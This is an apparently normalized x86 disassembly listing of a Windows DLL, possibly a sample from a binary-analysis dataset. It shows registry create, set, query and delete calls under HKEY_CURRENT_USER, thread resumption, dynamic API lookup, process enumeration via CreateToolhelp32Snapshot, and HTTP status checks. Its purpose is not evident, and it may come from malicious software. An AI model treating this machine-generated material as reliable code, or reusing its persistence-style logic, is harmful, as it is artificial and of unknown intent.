lea ecx [ ebp - 0x74 ]
mov [ ebp - 0x4 ] edi
call sub_100012f3
lea eax [ ebp - 0x90 ]
push eax
lea eax [ ebp - 0x74 ]
push eax
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0x2
call sub_10011694
push ebx
push edi
lea ecx [ ebp - 0x74 ]
call sub_10002597
push ebx
push edi
lea ecx [ ebp - 0x90 ]
mov [ ebp - 0x4 ] 0x5
call sub_10002597
push r--data
lea ecx [ ebp - 0x3c ]
call sub_100012f3
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0xb8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x4 ] 0x6
call sub_100117b2
lea ecx [ ebp - 0x58 ]
push ecx
push eax
mov [ ebp - 0x4 ] 0x7
call sub_10011c16
push 0xffffffff
push ebx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x8
call sub_10002033
push ebx
push edi
lea ecx [ ebp - 0x58 ]
call sub_10002597
lea esi [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x6
call sub_10011bce
push ebx
push edi
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x4 ] 0x5
call sub_10002597
push r--data
lea ecx [ ebp - 0x3c ]
call sub_100012f3
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0xb8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x4 ] 0x9
call sub_100117b2
lea ecx [ ebp - 0x58 ]
push ecx
push eax
mov [ ebp - 0x4 ] 0xa
call sub_10011c16
push 0xffffffff
mov [ ebp - 0x4 ] 0xb
mov ecx [ ebp - 0x10 ]
push ebx
push eax
add ecx 0x1c
call sub_10002033
push ebx
push edi
lea ecx [ ebp - 0x58 ]
call sub_10002597
lea esi [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x9
call sub_10011bce
push ebx
push edi
lea ecx [ ebp - 0x3c ]
call sub_10002597
lea ecx [ ebp - 0x20 ]
call sub_10011795
mov eax [ ebp - 0x10 ]
call sub_10023f0b
retn
sub_10011135
push 0x8c
mov eax sub_10049d16
call sub_10023e33
mov edi ecx
push r--data
lea ecx [ ebp - 0x54 ]
call sub_100012f3
xor ebx ebx
push r--data
lea ecx [ ebp - 0x70 ]
mov [ ebp - 0x4 ] ebx
call sub_100012f3
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x1
call sub_10011694
push ebx
push 0x1
lea ecx [ ebp - 0x70 ]
call sub_10002597
push ebx
push 0x1
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x4
call sub_10002597
push r--data
lea ecx [ ebp - 0x38 ]
call sub_100012f3
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov [ ebp - 0x4 ] 0x5
call sub_10011c97
pop ecx
pop ecx
lea ecx [ ebp - 0x1c ]
push ecx
mov ecx eax
mov [ ebp - 0x4 ] 0x6
call sub_10011a0b
lea esi [ ebp - 0x98 ]
mov [ ebp - 0x4 ] 0x5
call sub_10011bce
push ebx
push 0x1
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x4 ] 0x4
call sub_10002597
push r--data
lea ecx [ ebp - 0x38 ]
call sub_100012f3
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x98 ]
add edi 0x1c
push eax
mov [ ebp - 0x4 ] 0x7
call sub_10011c97
pop ecx
pop ecx
lea ecx [ ebp - 0x1c ]
push ecx
mov ecx eax
mov [ ebp - 0x4 ] 0x8
call sub_10011a0b
lea esi [ ebp - 0x98 ]
mov [ ebp - 0x4 ] 0x7
call sub_10011bce
push ebx
push 0x1
lea ecx [ ebp - 0x38 ]
call sub_10002597
lea ecx [ ebp - 0x1c ]
call sub_10011795
call sub_10023f0b
retn
sub_10011240
push 0x11c
mov eax sub_1004a6b4
call sub_10023ed2
push [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov edi edx
push eax
push edi
mov [ ebp - 0x5c ] edi
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x58 ] eax
call sub_10014107
push edi
call sub_100141d4
cmp eax 0xc8
je r-xdata
call sub_10023f2e
retn
cmp eax 0x197
je r-xdata
xor ebx ebx
push ebx
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x38 ] 0x7
call sub_10002579
lea ecx [ ebp - 0x34 ]
call sub_10001b23
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0xb0 ]
mov [ ebp - 0x4 ] 0x2
call sub_10010fb9
mov esi eax
push 0xffffffff
push ebx
push esi
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x4 ] 0x3
call sub_10002033
push 0xffffffff
push ebx
add esi 0x1c
push esi
lea ecx [ ebp - 0x34 ]
call sub_10002033
lea esi [ ebp - 0xb0 ]
call sub_1001111d
mov [ ebp - 0x4 ] 0x1
jmp sub_10011325
push r--data
lea ecx [ ebp - 0x78 ]
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x78 ]
push eax
lea ecx [ ebp - 0x128 ]
call sub_10001d6b
push r--data
lea eax [ ebp - 0x128 ]
push eax
call sub_10023a01
sub_10011325
mov esi r--data
push esi
lea ecx [ ebp - 0x34 ]
call sub_1000ccf6
test eax eax
je r-xdata
lea ebx [ ebp - 0xb0 ]
call sub_1001ae25
mov esi eax
push 0xffffffff
push 0x0
push esi
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x4 ] 0x6
call sub_10002033
push 0xffffffff
push 0x0
add esi 0x1c
push esi
lea ecx [ ebp - 0x34 ]
call sub_10002033
mov esi ebx
mov [ ebp - 0x4 ] 0x1
call sub_1001111d
push [ ebp + 0xc ]
mov ecx [ ebp - 0x54 ]
push [ ebp - 0x58 ]
push edi
call sub_10014107
push edi
call sub_100141d4
cmp eax 0xc8
je r-xdata
push esi
lea ecx [ ebp - 0x50 ]
call sub_1000ccf6
test eax eax
je r-xdata
lea ecx [ ebp - 0x50 ]
call sub_10011135
push r--data
lea ecx [ ebp - 0x94 ]
call sub_10001d1f
lea eax [ ebp - 0x94 ]
push eax
lea ecx [ ebp - 0xd8 ]
mov [ ebp - 0x4 ] 0x7
call sub_10001d6b
push r--data
lea eax [ ebp - 0xd8 ]
jmp r-xdata
cmp [ ebp - 0x38 ] 0x8
mov eax [ ebp - 0x4c ]
jae r-xdata
push eax
call sub_10023a01
xor ebx ebx
push ebx
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x38 ] 0x7
call sub_10002579
lea ecx [ ebp - 0x34 ]
call sub_10001b23
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0xb0 ]
mov [ ebp - 0x4 ] 0x2
call sub_10010fb9
mov esi eax
push 0xffffffff
push ebx
push esi
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x4 ] 0x3
call sub_10002033
push 0xffffffff
push ebx
add esi 0x1c
push esi
lea ecx [ ebp - 0x34 ]
call sub_10002033
lea esi [ ebp - 0xb0 ]
call sub_1001111d
mov [ ebp - 0x4 ] 0x1
jmp sub_10011325
mov ecx [ ebp - 0x3c ]
add ecx ecx
push ecx
push eax
push 0x2b
push edi
call sub_1001434a
cmp [ ebp - 0x1c ] 0x8
mov eax [ ebp - 0x30 ]
jae r-xdata
lea eax [ ebp - 0x4c ]
mov ecx [ ebp - 0x20 ]
add ecx ecx
push ecx
push eax
push 0x2c
push edi
call sub_1001434a
push [ ebp + 0xc ]
mov ecx [ ebp - 0x54 ]
push [ ebp - 0x58 ]
push edi
call sub_10014107
push edi
call sub_100141d4
cmp eax 0xc8
je r-xdata
lea eax [ ebp - 0x30 ]
lea esi [ ebp - 0x50 ]
call sub_1001111d
call sub_10023f2e
retn
cmp eax 0x197
je r-xdata
push r--data
lea ecx [ ebp - 0x78 ]
call sub_10001d1f
lea eax [ ebp - 0x78 ]
push eax
lea ecx [ ebp - 0x100 ]
mov [ ebp - 0x4 ] 0x5
call sub_10001d6b
push r--data
lea eax [ ebp - 0x100 ]
jmp r-xdata
sub_1001147a
push ebp
mov ebp esp
sub esp 0x30
cmp [ ebp + 0x8 ] 0x0
push ebx
push esi
je r-xdata
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
test eax eax
je r-xdata
push [ ebp + 0xc ]
mov ebx eax
lea esi [ ebp - 0x2c ]
call sub_1001264a
push r--data
mov eax esi
push eax
call sub_10023a01
sub_100114b0
push esi
push edi
mov edi [ esp + 0xc ]
push edi
mov esi ecx
call sub_100114d1
mov [ esi ] r--data
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
pop edi
mov eax esi
pop esi
retn 0x4
sub_1001150b
push 0x48
mov eax sub_10049032
call sub_10023e33
mov eax [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] r--data
mov [ eax + 0x4 ] edx
and [ ebp - 0x4 ] 0x0
mov [ eax ] r--data
mov edx [ ecx + 0x4 ]
mov [ eax + 0x8 ] edx
cmp [ ecx ] 0x0
jne r-xdata
call sub_10023f0b
retn 0x4
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001d1f
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x1
call sub_10001d6b
push r--data
lea eax [ ebp - 0x54 ]
push eax
call sub_10023a01
sub_1001156d
push 0x20
mov eax sub_100498f5
call sub_10023e33
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
call [ ResumeThread@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
cmp esi 0xffffffff
setne al
movzx eax al
push eax
call sub_1001147a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100023ce
call [ GetLastError@IAT ]
cmp eax 0x12
je r-xdata
call sub_10023f0b
retn 0x4
sub_100115d1
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10049cbd
mov eax [ fs : 0x0 ]
push eax
sub esp 0x68
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x70 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
push r--data
lea ecx [ esp + 0x10 ]
mov esi eax
call sub_10001d1f
and [ esp + 0x78 ] 0x0
lea eax [ esp + 0xc ]
push eax
cmp esi 0xffffffff
sete al
movzx eax al
push eax
call sub_1001147a
or [ esp + 0x80 ] 0xffffffff
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ esp + 0x14 ]
call sub_100023ce
test esi esi
je r-xdata
mov ecx [ esp + 0x70 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push r--data
lea ecx [ esp + 0x2c ]
call sub_10001d1f
lea eax [ esp + 0x28 ]
push eax
lea ecx [ esp + 0x48 ]
mov [ esp + 0x7c ] 0x1
call sub_10001d6b
push r--data
lea eax [ esp + 0x48 ]
push eax
call sub_10023a01
sub_10011694
push 0x94
mov eax sub_10049511
call sub_10023e33
mov esi ecx
mov ecx [ ebp + 0xc ]
xor eax eax
lea edi [ esi + 0x4 ]
lea ebx [ esi + 0x8 ]
push r--data
mov [ esi ] r--data
mov [ edi ] eax
mov [ ebx ] eax
mov [ ebp - 0x14 ] eax
call sub_1000ccf6
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp [ edi ] ebx
jne r-xdata
push r--data
lea ecx [ ebp - 0x4c ]
call sub_10001d1f
lea eax [ ebp - 0x4c ]
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp + 0xc ]
push eax
lea esi [ ebp - 0xa0 ]
call sub_1001264a
push r--data
mov eax esi
push ebx
push edi
xor ebx ebx
push ebx
push 0xf003f
push ebx
push [ ebp - 0x14 ]
push ebx
push eax
push 0x80000001
call [ RegCreateKeyExW@IAT ]
mov [ ebp + 0xc ] eax
cmp eax ebx
je r-xdata
mov [ ebp - 0x14 ] eax
mov eax esi
call sub_10023f0b
retn 0x8
push r--data
lea ecx [ ebp - 0x30 ]
call sub_10001d1f
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x74 ]
mov [ ebp - 0x4 ] 0x1
call sub_10001d6b
push r--data
lea eax [ ebp - 0x74 ]
jmp r-xdata
push eax
call sub_10023a01
sub_100117b2
push 0x88
mov eax sub_100494e3
call sub_10023e33
mov eax [ ebp + 0x10 ]
xor ebx ebx
mov [ ebp - 0x20 ] ebx
cmp [ eax + 0x18 ] 0x8
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
jb r-xdata
add eax 0x4
add eax 0x4
mov eax [ eax ]
jmp r-xdata
push 0x20
call sub_10020186
mov esi eax
pop ecx
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x4 ] 0x2
cmp esi ebx
je r-xdata
push r--data
lea ecx [ ebp - 0x40 ]
call sub_10001d1f
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x1
push eax
mov ebx esi
mov edi [ RegQueryValueExW@IAT ]
lea ecx [ ebp - 0x14 ]
push ecx
push ebx
lea ecx [ ebp - 0x10 ]
push ecx
push ebx
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
call edi
mov esi eax
cmp esi ebx
je r-xdata
xor esi esi
push ebx
push [ ebp - 0x14 ]
lea ecx [ esi + 0x4 ]
call sub_10005ad1
mov [ esi ] r--data
jmp r-xdata
add eax 0x8
mov eax [ eax + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] bl
push esi
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x1c ] esi
call sub_10011d93
push esi
lea eax [ ebp - 0x1c ]
push esi
push eax
call sub_100289c4
add esp 0xc
mov [ ebp - 0x4 ] 0x3
mov eax [ ebp - 0x1c ]
cmp [ eax + 0x1c ] 0x10
jb r-xdata
lea ecx [ esi + 0x4 ]
mov ecx [ esi + 0x4 ]
jmp r-xdata
mov esi [ ebp + 0x10 ]
cmp [ esi + 0x18 ] 0x8
jb r-xdata
push esi
push ecx
push ecx
mov ecx [ ebp - 0x1c ]
mov eax esp
mov [ eax ] ecx
lea ecx [ ebp - 0x18 ]
mov [ ebp + 0x10 ] esp
push ecx
lea ecx [ eax + 0x4 ]
call sub_1000ad88
push [ ebp - 0x10 ]
lea eax [ ebp - 0x94 ]
push eax
call sub_10011b7b
mov [ ebp - 0x4 ] 0x5
push [ ebp + 0xc ]
mov ecx eax
call sub_1001193c
lea esi [ ebp - 0x94 ]
mov [ ebp - 0x20 ] 0x1
mov [ ebp - 0x4 ] 0x3
call sub_10011bce
mov [ ebp - 0x4 ] bl
mov ecx [ ebp - 0x18 ]
cmp ecx ebx
je r-xdata
push r--data
lea ecx [ ebp - 0x40 ]
call sub_10001d1f
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x4
push eax
mov ebx edi
jmp r-xdata
lea edx [ ebp - 0x14 ]
push edx
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push ebx
push ecx
push [ eax + 0x4 ]
call edi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ ebp + 0xc ]
call sub_10023f0b
retn 0xc
call sub_1000ad5c
lea esi [ ebp - 0x6c ]
call sub_1001264a
push r--data
mov eax esi
push eax
call sub_10023a01
sub_1001193c
push 0x0
mov eax sub_10049482
call sub_10023e33
mov edi ecx
mov esi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ esi ] eax
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
lea ecx [ esi + 0x8 ]
call sub_1000ad88
and [ ebp - 0x4 ] 0x0
add edi 0xc
push edi
lea ecx [ esi + 0xc ]
call sub_100020c6
mov eax esi
call sub_10023f0b
retn 0x4
sub_1001197d
push 0x4c
mov eax sub_1004945c
call sub_10023e33
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x1c ] 0x10
mov edx [ eax + 0x18 ]
jb r-xdata
add eax 0x8
mov eax [ eax + 0x8 ]
jmp r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp + 0x14 ]
test ecx ecx
je r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001d1f
lea eax [ ebp - 0x28 ]
push eax
lea esi [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x1
call sub_1001264a
push r--data
mov eax esi
push eax
call sub_10023a01
push edx
push eax
push [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push 0x0
push ecx
push [ eax + 0x4 ]
call [ RegSetValueExW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
call sub_10023f0b
retn 0x10
call sub_1000ad5c
sub_10011a0b
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10049c92
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
mov edi ecx
push ecx
push ecx
mov esi esp
mov eax edi
mov [ esp + 0x14 ] esp
call sub_10011be7
and [ esp + 0x40 ] 0x0
lea eax [ esp + 0x18 ]
push eax
mov eax edi
call sub_10011bfb
mov [ esp + 0x40 ] 0x1
mov edi [ edi ]
push edi
push [ ebp + 0x8 ]
mov ecx eax
mov [ esp + 0x48 ] 0x2
call sub_1001197d
push 0x0
push 0x1
lea ecx [ esp + 0x18 ]
call sub_10002597
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10011a90
push 0x4c
mov eax sub_10049431
call sub_10023e33
mov eax [ ebp + 0xc ]
xor esi esi
cmp [ eax + 0x18 ] 0x8
mov [ ebp + 0xc ] esi
mov [ ebp - 0x10 ] esi
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp ebx esi
je r-xdata
xor al al
jmp r-xdata
lea ecx [ ebp + 0xc ]
push ecx
push esi
lea ecx [ ebp - 0x10 ]
push ecx
push esi
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
call [ RegQueryValueExW@IAT ]
mov ebx eax
cmp ebx 0x2
jne r-xdata
mov al 0x1
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001d1f
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] esi
push eax
lea esi [ ebp - 0x58 ]
call sub_1001264a
push r--data
mov eax esi
push eax
call sub_10023a01
call sub_10023f0b
retn 0x8
sub_10011b0e
push 0x48
mov eax sub_1004940e
call sub_10023e33
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
test ebx ebx
je r-xdata
xor al al
jmp r-xdata
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
call [ RegDeleteValueW@IAT ]
mov ebx eax
cmp ebx 0x2
jne r-xdata
mov al 0x1
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea esi [ ebp - 0x54 ]
call sub_1001264a
push r--data
mov eax esi
push eax
call sub_10023a01
call sub_10023f0b
retn 0x8
sub_10011b7b
push 0x0
mov eax sub_100493eb
call sub_10023e33
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0x4 ] eax
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ esi + 0x8 ]
call sub_1000ad88
push [ ebp + 0x18 ]
lea ecx [ esi + 0xc ]
mov [ ebp - 0x4 ] 0x1
call sub_100020c6
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp + 0x14 ]
test ecx ecx
je r-xdata
mov eax esi
call sub_10023f0b
retn 0x14
call sub_1000ad5c
sub_10011c16
push 0x14
mov eax sub_100493bd
call sub_10023e33
mov eax [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
lea esi [ ebp - 0x20 ]
call sub_10011be7
mov edi eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
inc ebx
lea esi [ ebp - 0x18 ]
mov [ ebp - 0x4 ] ebx
call sub_10011be7
mov [ ebp - 0x4 ] 0x2
mov eax [ eax ]
cmp [ eax + 0x1c ] 0x10
mov ecx [ edi ]
mov ecx [ ecx + 0x18 ]
jb r-xdata
add eax 0x8
mov eax [ eax + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x1c ]
test ecx ecx
je r-xdata
call sub_1000ad5c
dec ecx
shr ecx 0x1
push ecx
mov ecx [ ebp + 0xc ]
push eax
call sub_1000482d
mov [ ebp - 0x4 ] bl
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x10 ] ebx
test ecx ecx
je r-xdata
mov eax [ ebp + 0xc ]
call sub_10023f0b
retn 0x8
call sub_1000ad5c
sub_10011c97
push 0x3c
mov eax sub_10049c67
call sub_10023e33
and [ ebp - 0x14 ] 0x0
push 0x20
call sub_10020186
mov esi eax
pop ecx
mov [ ebp - 0x18 ] esi
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
cmp [ edi + 0x18 ] 0x8
mov ecx [ edi + 0x14 ]
jb r-xdata
lea ecx [ eax + 0x8 ]
mov ecx [ eax + 0x8 ]
jmp r-xdata
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
call sub_10023f0b
retn
call sub_1000ad5c
push [ ebp + 0xc ]
mov eax [ edi + 0x14 ]
push ecx
push ecx
xor edx edx
mov [ ecx + eax * 2 ] dx
mov ecx [ ebp - 0x20 ]
mov eax esp
mov [ eax ] ecx
lea ecx [ ebp - 0x1c ]
mov [ ebp + 0xc ] esp
push ecx
lea ecx [ eax + 0x4 ]
call sub_1000ad88
push ebx
lea eax [ ebp - 0x48 ]
push eax
call sub_10011b7b
mov [ ebp - 0x4 ] 0x3
push [ ebp + 0x8 ]
mov ecx eax
call sub_1001193c
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0x2
call sub_10011bce
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x1c ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0x0
push esi
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x20 ] esi
call sub_10011d93
push esi
lea eax [ ebp - 0x20 ]
push esi
push eax
call sub_100289c4
add esp 0xc
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x20 ]
cmp [ eax + 0x1c ] 0x10
jb r-xdata
lea ecx [ ecx + ecx + 0x2 ]
push ecx
push eax
call sub_10013a24
mov esi eax
jmp r-xdata
sub_10011d93
push 0x4
mov eax sub_100488d2
call sub_10023e66
mov esi ecx
and [ esi ] 0x0
and [ ebp - 0x4 ] 0x0
push 0x10
call sub_10020186
pop ecx
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
inc ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] eax
mov eax esi
call sub_10023f0b
retn 0x4
sub_10011e12
push 0x1c
mov eax sub_10049c19
call sub_10023e33
push r--data
lea ecx [ ebp - 0x28 ]
mov [ esi ] r--data
call sub_100012f3
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
call sub_10011e5c
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
mov [ esi + 0x4 ] eax
call sub_10002597
mov eax esi
call sub_10023f0b
retn
sub_10011e5c
push 0x20
mov eax sub_100498f5
call sub_10023e33
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push eax
call [ GetModuleHandleW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov esi eax
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
test esi esi
sete al
movzx eax al
push eax
call sub_1001147a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100023ce
mov eax esi
call sub_10023f0b
retn 0x4
sub_10011ebd
push 0x44
mov eax sub_10049bf6
call sub_10023e33
lea eax [ ebp - 0x10 ]
push eax
push sub_100289c4
xor ebx ebx
push 0x6
mov [ ebp - 0x10 ] ebx
call [ GetModuleHandleExW@IAT ]
mov esi r--data
push esi
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x14 ] eax
call sub_10001d1f
xor edi edi
lea eax [ ebp - 0x30 ]
inc edi
cmp [ ebp - 0x14 ] edi
push eax
setne al
movzx eax al
push eax
mov [ ebp - 0x4 ] ebx
call sub_1001147a
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push ebx
push edi
lea ecx [ ebp - 0x30 ]
call sub_100023ce
push esi
lea ecx [ ebp - 0x4c ]
call sub_10001d1f
mov [ ebp - 0x4 ] edi
cmp [ ebp - 0x10 ] ebx
lea eax [ ebp - 0x4c ]
push eax
sete al
movzx eax al
push eax
call sub_1001147a
pop ecx
pop ecx
push ebx
push edi
lea ecx [ ebp - 0x4c ]
call sub_100023ce
mov eax [ ebp - 0x10 ]
call sub_10023f0b
retn
sub_10011f4d
push 0x1c
mov eax sub_1004993b
call sub_10023e33
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov eax esi
call [ GetLastError@IAT ]
cmp eax 0x2
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
jne r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001d1f
and [ ebp - 0x4 ] esi
lea eax [ ebp - 0x28 ]
push eax
push 0x1
call sub_1001147a
pop ecx
pop ecx
push esi
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100023ce
jmp r-xdata
call sub_10023f0b
retn 0x8
sub_10011fbc
push 0x1c
mov eax sub_1004993b
call sub_10023e33
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
call [ GetProcAddress@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov esi eax
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
test esi esi
sete al
movzx eax al
push eax
call sub_1001147a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100023ce
mov eax esi
call sub_10023f0b
retn 0x8
sub_10012023
push 0x230
mov eax sub_10049bbe
call sub_10023e9c
mov eax [ ebp + 0x8 ]
and [ ebp - 0x220 ] 0x0
mov esi 0x208
push esi
mov [ ebp - 0x21c ] eax
lea eax [ ebp - 0x218 ]
push 0x0
push eax
call sub_100209e0
add esp 0xc
push esi
lea eax [ ebp - 0x218 ]
push eax
push [ ebp - 0x21c ]
call [ GetModuleFileNameW@IAT ]
push r--data
lea ecx [ ebp - 0x23c ]
mov esi eax
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x23c ]
push eax
test esi esi
sete al
movzx eax al
push eax
call sub_1001147a
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x23c ]
call sub_100023ce
push esi
lea eax [ ebp - 0x218 ]
push eax
mov ecx ebx
call sub_1000482d
mov eax ebx
call sub_10023f1f
retn
sub_100120c4
push ecx
push ecx
and [ esp + 0x4 ] 0x0
push ebx
push [ eax + 0x4 ]
mov ebx ecx
call sub_10012023
pop ecx
mov eax ebx
pop ebx
pop ecx
pop ecx
retn
sub_100120ff
push 0x3c
mov eax sub_10049b98
call sub_10023e33
xor edi edi
push edi
push 0x2
call CreateToolhelp32Snapshot
mov esi r--data
push esi
lea ecx [ ebp - 0x28 ]
mov ebx eax
call sub_10001d1f
lea eax [ ebp - 0x28 ]
push eax
cmp ebx edi
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] edi
call sub_1001147a
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push edi
inc edi
push edi
lea ecx [ ebp - 0x28 ]
call sub_100023ce
push esi
lea ecx [ ebp - 0x44 ]
call sub_10001d1f
lea eax [ ebp - 0x44 ]
push eax
cmp ebx 0xffffffff
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] edi
call sub_1001147a
pop ecx
pop ecx
push 0x0
